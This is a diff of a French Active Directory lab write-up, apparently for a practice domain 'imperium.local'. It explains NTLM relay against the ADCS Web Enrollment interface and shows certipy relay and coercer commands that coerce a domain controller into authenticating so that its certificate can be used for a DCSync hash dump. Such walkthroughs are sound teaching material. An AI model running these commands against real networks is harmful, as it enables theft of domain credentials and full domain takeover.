@@ -288,6 +288,26 @@ certipy req -ca 'IMPERIUM-CA' -retrieve 42 ...
 
 **Principe :** L'interface Web Enrollment (`/certsrv`) fonctionne en HTTP sans signing ni EPA (Extended Protection for Authentication). On peut donc faire un **NTLM Relay** : forcer un compte à s'authentifier vers nous, et relayer cette authentification vers la CA pour obtenir un certificat en son nom.
 
+Le cœur du problème :
+
+- Une interface web appelée **Web Enrollment** permet de demander des certificats
+- Elle accepte des connexions en **HTTP (non chiffré et sans protection avancée)**
+- Elle utilise **NTLM authentication**
+- Et surtout : elle ne vérifie pas correctement _qui est derrière la requête_
+
+### C’est quoi un NTLM Relay ?
+
+Normalement :
+1. Un utilisateur se connecte à un service
+2. Il prouve son identité via NTLM
+3. Le service accepte ou refuse
+
+Dans un **NTLM relay attack** :
+- Tu ne déchiffres pas le mot de passe
+- Tu ne le voles pas directement
+- Tu fais juste un “proxy malveillant”
+
+Résultat : on peut **intercepter une authentification NTLM et la “relayer” ailleurs**
 **Cible idéale :** Le machine account d'un DC (`DC$`). Si on obtient son certificat → on peut faire un DCSync (dump de tous les hashes du domaine).
 
 **Dans imperium.local :**
@@ -307,7 +327,7 @@ certipy relay -target http://caladan.imperium.local/certsrv/certfnsh.asp -templa
 
 # Terminal 2 — Forcer le DC à s'authentifier vers toi (coercion)
 # Options : coercer, printerbug, petitpotam, dfscoerce...
-coercer coerce -u yueh.wellington -p 'PASSWORD' -d imperium.local --target caladan.imperium.local --listener-ip <TON_IP>
+coercer coerce -u yueh.wellington -p 'PASSWORD' -d imperium.local --target-ip $IP --listener-ip <TON_IP>
 
 # Résultat : certipy reçoit l'auth du DC, demande un cert à sa place
 # → caladan.pfx (cert du machine account du DC)
